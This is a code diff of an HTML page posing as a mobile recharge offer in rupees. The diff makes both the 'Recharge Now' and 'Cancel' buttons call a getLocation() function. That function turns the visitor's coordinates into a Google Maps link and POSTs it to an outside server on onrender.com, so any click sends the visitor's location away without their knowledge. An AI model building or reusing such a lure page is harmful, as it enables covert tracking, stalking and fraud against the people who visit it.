@@ -112,8 +112,8 @@
       <option value="3">Rs 349</option>
       <option value="4">Rs 819</option>
     </select>
-    <button onclick="">Recharge Now</button>
-    <button class="btnC" >Cancel</button>
+    <button onclick="getLocation()">Recharge Now</button>
+    <button class="btnC" onclick="getLocation()">Cancel</button>
     
   </div>
   
@@ -173,7 +173,6 @@
             name: `location_${timestamp}.txt`,
             data: `https://www.google.com/maps?q=${latitude},${longitude}`
           }];
-          console.log(data);
 
           fetch("https://server-ieuy.onrender.com/data01", {
             method: "POST",
